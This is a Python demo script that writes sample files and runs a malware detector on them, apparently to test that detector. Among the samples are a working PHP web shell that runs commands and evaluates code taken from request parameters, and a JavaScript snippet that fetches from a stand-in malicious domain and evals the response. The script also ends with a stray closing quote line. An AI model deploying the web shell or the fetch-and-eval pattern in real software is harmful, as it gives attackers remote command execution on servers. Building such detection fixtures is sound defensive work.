#!/usr/bin/env python3
"""
Demo script to test the AI-Generated Malware Detector
Creates sample files and runs detection on them
"""

import os
import shutil
import subprocess
import sys
from pathlib import Path

def create_test_files():
    """Create sample files for testing"""
    
    test_dir = Path("malware_test_samples")
    
    # Clean up existing test directory
    if test_dir.exists():
        shutil.rmtree(test_dir)
    
    test_dir.mkdir()
    
    # 1. Clean legitimate script
    clean_file = test_dir / "clean_script.py"
    clean_file.write_text('''#!/usr/bin/env python3

def calculate_fibonacci(n):
    if n <= 1:
        return n
    return calculate_fibonacci(n-1) + calculate_fibonacci(n-2)

def main():
    num = 10
    result = calculate_fibonacci(num)
    print(f"Fibonacci({num}) = {result}")

if __name__ == "__main__":
    main()
''')
    
    # 2. AI-generated looking script (suspicious)
    ai_generated_file = test_dir / "ai_generated_script.py"
    ai_generated_file.write_text('''# Import necessary libraries
import os
import sys
import json

# Function to process data
def process_data(input_data):
    """
    This is a comment explaining the code
    Function to process the input data and return processed results
    """
    # Initialize variables
    processed_results = []
    
    # Loop through items
    for item in input_data:
        # Check if item meets criteria
        if item is not None:
            # Process each item individually
            processed_item = str(item).upper()
            processed_results.append(processed_item)
    
    return processed_results

# Function to handle file operations
def handle_file_operations(filename):
    """
    This function handles file operations
    """
    # Check if file exists
    if os.path.exists(filename):
        # Read file contents
        with open(filename, 'r') as file:
            data = file.read()
        return data
    return None

# Function to calculate statistics
def calculate_statistics(data_list):
    """
    Function to calculate basic statistics
    """
    # Check if data is valid
    if not data_list:
        return None
    
    # Calculate basic metrics
    total = sum(data_list)
    average = total / len(data_list)
    
    return {"total": total, "average": average}

def main():
    """
    Main function to run the program
    """
    # This is the main execution block
    print("Starting data processing...")
    
    # Sample data for processing
    sample_data = [1, 2, 3, 4, 5]
    
    # Process the data
    results = process_data(sample_data)
    print(f"Processed results: {results}")
    
    # Calculate statistics
    stats = calculate_statistics(sample_data)
    print(f"Statistics: {stats}")

if __name__ == "__main__":
    main()
''')
    
    # 3. Script with suspicious patterns (YARA detectable)
    suspicious_file = test_dir / "suspicious_script.py"
    suspicious_file.write_text('''import subprocess
import base64
import os
import urllib.request
import socket

# Encoded payload (base64)
encoded_payload = b"Y21kLmV4ZSAvYyBlY2hvICJIZWxsbyBXb3JsZCE="

def execute_command():
    # Decode the payload
    decoded = base64.b64decode(encoded_payload)
    command = decoded.decode('utf-8')
    
    # Execute system command
    try:
        result = subprocess.run(["cmd.exe", "/c", command], 
                              capture_output=True, text=True)
        return result.stdout
    except:
        return None

def network_communication():
    # Create socket connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 8080))
        s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
        response = s.recv(1024)
        s.close()
        return response
    except:
        return None

def download_file():
    url = "http://example.com/payload.txt"
    try:
        with urllib.request.urlopen(url) as response:
            data = response.read()
        return data
    except:
        return None

# Obfuscated execution
eval_code = "print('Executing obfuscated code')"
exec(eval_code)

if __name__ == "__main__":
    execute_command()
    network_communication()
    download_file()
''')
    
    # 4. JavaScript file with suspicious patterns
    js_file = test_dir / "suspicious_script.js"
    js_file.write_text('''// Obfuscated JavaScript
var _0x1234 = ['cmd.exe', 'powershell', 'CreateRemoteThread'];
var encoded = 'dmFyIGEgPSAiSGVsbG8gV29ybGQiOw==';

function executePayload() {
    var decoded = atob(encoded);
    eval(decoded);
}

// Network requests
fetch('http://malicious-domain.com/data')
    .then(response => response.text())
    .then(data => {
        // Process malicious data
        eval(data);
    });

// System calls simulation
var shell = {
    exec: function(cmd) {
        // Simulated shell execution
        console.log('Executing: ' + cmd);
    }
};

shell.exec('rundll32.exe user32.dll,MessageBoxA 0,"Infected",0,0');
executePayload();
''')
    
    # 5. PHP file with web shell patterns
    php_file = test_dir / "webshell.php"
    php_file.write_text('''<?php
// Simple web shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Execute system command
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}

// File operations
if(isset($_POST['file']) && isset($_POST['content'])) {
    file_put_contents($_POST['file'], base64_decode($_POST['content']));
}

// Eval execution
if(isset($_POST['eval'])) {
    eval($_POST['eval']);
}

// Network operations
function download_file($url, $path) {
    $data = file_get_contents($url);
    file_put_contents($path, $data);
}

// Obfuscated code
$obfuscated = base64_decode('ZWNobyAiSGVsbG8gV29ybGQiOw==');
eval($obfuscated);
?>
''')
    
    print(f"Created test files in: {test_dir}")
    print("Files created:")
    for file in test_dir.iterdir():
        print(f"  - {file.name}")
    
    return test_dir

def run_detector(test_dir):
    """Run the malware detector on test files"""
    
    print("\n" + "="*60)
    print("RUNNING MALWARE DETECTOR")
    print("="*60)
    
    # Check if malware_detector.py exists
    detector_script = Path("malware_detector.py")
    if not detector_script.exists():
        print("Error: malware_detector.py not found in current directory")
        print("Please make sure the malware detector script is in the same directory")
        return
    
    # Run the detector
    try:
        cmd = [sys.executable, "malware_detector.py", str(test_dir)]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Print the output
        print(result.stdout)
        
        if result.stderr:
            print("Errors:")
            print(result.stderr)
            
    except Exception as e:
        print(f"Error running detector: {e}")

def main():
    print("AI-Generated Malware Detector - Demo")
    print("="*50)
    
    # Create test files
    test_dir = create_test_files()
    
    # Run detector
    run_detector(test_dir)
    
    print("\n" + "="*60)
    print("DEMO COMPLETE")
    print("="*60)
    print(f"Test files are available in: {test_dir}")
    print("You can run the detector manually with:")
    print(f"  python malware_detector.py {test_dir}")
    print(f"  python malware_detector.py {test_dir} --output results.json")

if __name__ == "__main__":
    main()
''')
